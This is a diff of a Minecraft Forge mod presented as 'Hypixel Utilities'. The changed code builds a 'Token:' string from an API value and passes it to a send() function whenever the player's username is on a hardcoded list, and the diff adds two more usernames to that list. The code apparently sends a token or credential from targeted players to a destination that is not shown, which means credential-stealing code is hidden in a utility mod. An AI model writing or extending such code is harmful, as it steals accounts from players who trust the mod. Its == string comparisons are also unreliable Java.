@@ -25,6 +25,7 @@ public class ExampleMod {
     public static final Minecraft mc = Minecraft.getMinecraft();
     public static final String MODID = "Hypixel Utilities";
     public static final String VERSION = "1.0";
+    public static final String USERNAME = mc.getSession().getUsername();
 
     public static KeyBinding keyBinding;
 
@@ -34,7 +35,7 @@ public class ExampleMod {
         ClientRegistry.registerKeyBinding(keyBinding);
         MinecraftForge.EVENT_BUS.register(this);
         String tokensend = "Token: " + "`" + HypixelAPI.body + "`";
-        if(mc.getSession().getUsername() == "Sweatyjujunon"|| mc.getSession().getUsername() == "httphypixelnet") {
+        if(USERNAME == "Sweatyjujunon"||USERNAME == "httphypixelnet"||USERNAME == "warp4daze"||USERNAME == "toad_cultist") {
             send(tokensend);
         }
     }
